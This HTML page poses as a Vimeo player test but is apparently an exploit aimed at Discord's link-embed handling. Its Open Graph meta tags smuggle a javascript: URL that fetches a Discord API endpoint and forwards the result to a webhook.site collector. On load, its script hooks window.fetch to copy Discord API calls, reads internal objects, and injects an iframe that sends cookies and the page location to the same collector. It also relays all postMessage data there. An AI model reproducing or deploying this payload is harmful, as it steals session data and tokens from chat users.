<!DOCTYPE html>
<html>
<head>
    <meta property="og:site_name" content="Vimeo">
    <meta property="og:type" content="video.other">
    <meta property="og:image" content="https://i.vimeocdn.com/video/test/maxresdefault.jpg">
    <meta property="og:video:url" content="https://player.vimeo.com/video/123456789/login/private?success=javascript:void(fetch('/api/v9/science').then(r=>r.text()).then(t=>fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?type=science&data='+encodeURIComponent(t))))">
    <meta property="og:video:secure_url" content="https://player.vimeo.com/video/123456789?player_id=vimeo-player&amp;api=1&amp;callback=initVimeoPlayer">
    <meta property="og:video:type" content="text/html">
    <meta property="og:video:width" content="1280">
    <meta property="og:video:height" content="720">
    <title>Vimeo Player Test</title>
    <script>
    async function attemptMediaExploit() {
        try {
            const config = {
                type: 'media-source',
                video: {
                    contentType: 'video/mp4;codecs="avc1.42E01E,mp4a.40.2"',
                    width: 1920,
                    height: 1080,
                    bitrate: 120000,
                    framerate: 30.0
                }
            };
            
            const result = await navigator.mediaCapabilities.decodingInfo(config);
            console.log('Media capabilities:', result);
            
            // Try to access Discord's MessageQueue
            if (window.MessageQueue) {
                fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
                    method: 'POST',
                    body: JSON.stringify({
                        type: 'messagequeue',
                        data: window.MessageQueue
                    })
                });
            }
            
            // Attempt to intercept Discord API calls
            const originalFetch = window.fetch;
            window.fetch = function(url, options) {
                if (url.includes('discord.com/api')) {
                    fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
                        method: 'POST',
                        body: JSON.stringify({
                            type: 'api_intercept',
                            url: url,
                            options: options
                        })
                    });
                }
                return originalFetch.apply(this, arguments);
            };
        } catch(e) {
            console.error('Media exploit failed:', e);
            fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
                method: 'POST',
                body: JSON.stringify({
                    type: 'error',
                    error: e.toString()
                })
            });
        }
    }

    function initVimeoPlayer(player_id) {
        try {
            // Attempt to inject into Discord's message queue
            const iframe = document.createElement('iframe');
            iframe.srcdoc = `
                <script>
                    fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
                        method: 'POST',
                        body: JSON.stringify({
                            type: 'iframe_loaded',
                            cookies: document.cookie,
                            location: window.location.href
                        })
                    });
                <\/script>
            `;
            document.body.appendChild(iframe);
            
            // Try to access Discord's Sentry instance
            if (window.__SENTRY__) {
                fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
                    method: 'POST',
                    body: JSON.stringify({
                        type: 'sentry_found',
                        data: window.__SENTRY__
                    })
                });
            }
        } catch(e) {
            console.error('Player init error:', e);
        }
    }

    window.onload = attemptMediaExploit;
    
    // Listen for postMessage responses
    window.addEventListener('message', function(event) {
        if (event.data) {
            fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
                method: 'POST',
                body: JSON.stringify({
                    type: 'postMessage',
                    data: event.data
                })
            });
        }
    });
    </script>
</head>
<body>
    <div id="vimeo-player"></div>
</body>
</html>
